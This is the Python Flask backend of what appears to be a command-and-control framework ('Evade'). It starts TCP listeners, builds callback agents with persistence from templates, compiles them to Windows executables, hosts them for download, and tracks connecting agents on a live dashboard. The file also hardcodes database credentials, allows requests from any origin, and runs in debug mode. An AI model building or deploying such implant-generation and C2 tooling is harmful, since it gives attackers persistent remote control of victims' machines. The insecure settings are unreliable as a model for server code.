from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import subprocess
import uuid
import os
import logging
import threading
from flask_socketio import SocketIO,emit
# Import agent template functions
from agent_templates import tcp_agent_template, http_agent_template, https_agent_template
from tcp_server import start_tcp_server
from database import init_db,db,Agent,Session  

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

CORS(app, resources={r"/api/*": {"origins": "*"}})

app.config['UPLOAD_FOLDER'] = r"E:\\Github\\Repos\\Evade-A-C2-Framework\\COMPELTE\\generated_payloads"
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:postgres@127.0.0.1:5432/evade-c2'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize the database with your app
init_db(app)

@app.route('/api/configure-listener', methods=['POST'])
def configure_listener():
    data = request.get_json()
    protocol = data.get('protocol')
    port = int(data.get('port'))
    localIP = data.get('localIP')
    if not protocol or not port:
        return jsonify({'error': 'Missing required fields'}), 400
    if protocol.lower()=='tcp':
        try:
            thread = threading.Thread(target=start_tcp_server, args=(localIP, port))
            thread.daemon = True
            thread.start()
            return jsonify({'message': 'TCP server started'}), 200
        except Exception as e:
            return jsonify({'error': f'Failed to start TCP listener: {str(e)}'}), 500
    if protocol.lower()=='http':
        #start_http_server()
        pass
    if protocol.lower()=='https':
        #start_https_server()
        pass

    print({'message': f'Listener configured for {protocol} on {localIP} port {port}'})
    return jsonify({'message': f'Listener configured for {protocol} on {localIP} port {port}'}), 200
    

@app.route('/download/<filename>')
def download_payload(filename):
    try:
        # Log the requested filename for download
        print(f"Requested filename for download: {filename}")

        # Securely join the filename to the uploads folder
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        print(f"Constructed filepath: {filepath}")

        # Check if the file exists
        if not os.path.exists(filepath):
            print(f"File not found: {filepath}")  # Changed to print for visibility in console
            return jsonify({"error": "File not found"}), 404

        # Print the directory and filename being sent
        print(f"Sending file from directory: {app.config['UPLOAD_FOLDER']} with filename: {filename}")

        # Use send_from_directory with the corrected parameters
        return send_from_directory(directory=app.config['UPLOAD_FOLDER'], path=filename, as_attachment=True)
    except Exception as e:
        # Print the exception if the file download fails
        print("Failed to download file:", e)
        return jsonify({"error": "Internal server error"}), 500

@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.get_json()
    agent_id=str(uuid.uuid4())
    print(agent_id)
    print(data)
    required_fields = ["name", "lhost", "lport", "type", "protocol", "persistence"]
    if not all(field in data for field in required_fields):
        return jsonify({"error": "Missing required fields"}), 400
    # Extract parameters
    name, lhost, lport, payload_type, protocol, persistence = (
        data["name"], data["lhost"], data["lport"], data["type"], data["protocol"], data["persistence"]
    )

    userAgent = data.get("userAgent", "")
    sleepTimer = data.get("sleepTimer", "")

    # Choose the appropriate template function and prepare parameters
    if protocol == "tcp":
        agent_code = tcp_agent_template(lhost=lhost, lport=lport, persistence=persistence,agent_id=agent_id)
        # write into database about the agent
        # Prepare extra data for storage
        extra_data = {
            "name": name,
            "lhost": lhost,
            "lport": lport,
            "type": payload_type,
            "persistence": persistence,
            "userAgent": userAgent,
            "sleepTimer": sleepTimer
        }

        # Initialize a new Agent object with the data
        new_agent = Agent(
            agent_id=agent_id,
            protocol=protocol,
            extra_data=extra_data  # Storing extra data as JSON
        )

        # Add the new agent to the session and commit to save it to the database
        db.session.add(new_agent)
        db.session.commit()

    elif protocol == "http":
        try:
            print(f"Handling {protocol.upper()} protocol")
            print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
            
            if not all(param in data for param in ["userAgent", "sleepTimer"]):
                return jsonify({"error": "Missing required HTTP fields"}), 400
            print("----------------------------------------------")
            print("Sabai chha data haru")
            print("----------------------------------------------")
            # Use the HTTP agent template function
            agent_code = http_agent_template(
                lhost=lhost, 
                lport=lport, 
                persistence=persistence, 
                userAgent=userAgent, 
                sleepTimer=sleepTimer
            )

            print(agent_code)
        except Exception as e:
            # Log the exception or print for debugging
            print(f"Error generating HTTP agent: {e}")
            # Return a response indicating an internal error occurred
            return jsonify({"error": "An error occurred while generating the HTTP agent", "details": str(e)}), 500

    elif protocol == "https":
        print(f"Handling {protocol.upper()} protocol")
        print(f"User-Agent: {data.get('userAgent', 'Not provided')}, Sleep Timer: {data.get('sleepTimer', 'Not provided')}")
        
        if not all(param in data for param in ["userAgent", "sleepTimer"]):
            return jsonify({"error": "Missing required HTTPS fields"}), 400

        # Use the HTTPS agent template function
        agent_code = https_agent_template(
            lhost=lhost, 
            lport=lport, 
            persistence=persistence, 
            userAgent=data['userAgent'], 
            sleepTimer=data['sleepTimer']
        )

    else:
        return jsonify({"error": "Invalid protocol specified"}), 400

    print("----------------------------------------------")
    print("Filename ma pugyo")
    print("----------------------------------------------")
    # Save the generated code to a file
    filename = f"{name}_{str(uuid.uuid4())}{'.py' if payload_type == '.py' else '.exe'}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    with open(filepath, 'w') as file:
        file.write(agent_code)

    # Compile to .exe if needed
    if payload_type == '.exe':
        try:
            subprocess.run(['pyinstaller', '--onefile', '--distpath', app.config['UPLOAD_FOLDER'], '--name', filename, filepath], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to compile .exe file: {e}")
            return jsonify({"error": "Failed to compile .exe file"}), 500

    download_url = f"http://{request.host}/download/{filename}"
    return jsonify({"message": "Payload generated successfully", "downloadUrl": download_url})


@socketio.on('connect')
def handle_connect():
    print("Client connected")
    # Optionally, you can emit a message back to the newly connected client
    emit('connection_status', {'message': 'Successfully connected to the server'})

def notify_frontend(agent_id):
    """Function to notify the frontend about an agent's status."""
    with app.app_context():
        session = Session()
        agent = session.query(Agent).filter_by(agent_id=agent_id).first()
        if agent:
            print(f"Agent Data: ID={agent.agent_id}, Protocol={agent.protocol}, Last Seen={agent.last_seen}")
            print("-------------------------------------------------------")
            print("EMIT EMIT")
            print("-------------------------------------------------------")
            socketio.emit('agent_update', {
                'agent_id': agent.agent_id,
                'protocol': agent.protocol,
                'last_seen': agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')
            })
        session.close()

@app.route('/api/notify-agent-connection', methods=['POST'])
def notify_agent_connection():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        # Assuming notify_frontend is already defined and emits a WebSocket message
        notify_frontend(agent_id)
        return jsonify({'status': 'success'}), 200
    return jsonify({'error': 'Missing agent_id'}), 400

if __name__ == "__main__":
    #app.run(debug=True, port=5002)
    socketio.run(app,debug=True, port=5002,allow_unsafe_werkzeug=True)
